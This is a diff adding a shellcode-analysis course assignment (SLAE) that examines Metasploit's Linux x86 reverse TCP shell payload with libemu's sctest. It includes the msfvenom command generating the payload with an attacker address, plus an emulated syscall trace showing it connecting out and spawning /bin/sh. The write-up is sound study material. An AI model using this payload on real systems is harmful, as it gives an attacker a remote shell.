@@ -1,0 +1,99 @@
+Assignment 5 of the SLAE course by SecurityTube
+Analysis of a Metasploit payload (linux/x86/shell_reverse_tcp) using sctest in libemu 
+
+{}------------------------------------------------------------------------------{}
+
+
+# msfvenom -p linux/x86/shell_reverse_tcp --payload-options
+Options for payload/linux/x86/shell_reverse_tcp:
+
+
+       Name: Linux Command Shell, Reverse TCP Inline
+     Module: payload/linux/x86/shell_reverse_tcp
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 68
+       Rank: Normal
+
+Provided by:
+    Ramon de C Valle <rcvalle@metasploit.com>
+    joev <joev@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+CMD    /bin/sh          yes       The command string to execute
+LHOST                   yes       The listen address
+LPORT  4444             yes       The listen port
+
+Description:
+  Connect back to attacker and spawn a command shell
+
+{}------------------------------------------------------------------------------{}
+
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 | sctest -vvv -Ss 100000 -G shell_reverse_tcp.dot
+graph file shell_reverse_tcp.dot
+verbose = 3
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+{.......
+.......
+.......
+.......}
+
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 0;
+) =  0;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 1677830336 (host=192.168.1.100);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fa6 => 
+           = "//bin/sh";
+     const char * argv[] = [
+           = 0x00416f9e => 
+               = 0x00416fa6 => 
+                   = "//bin/sh";
+           = 0x00000000 => 
+             none;
+     ];
+     const char * envp[] = 0x00000000 => 
+         none;
+) =  0;
+
+
+{}------------------------------------------------------------------------------{}
+
+
+Converting the dot formate to a png (image)
+
+
+# dot shell_reverse_tcp.dot -Tpng -o shell_reverse_tcp.png
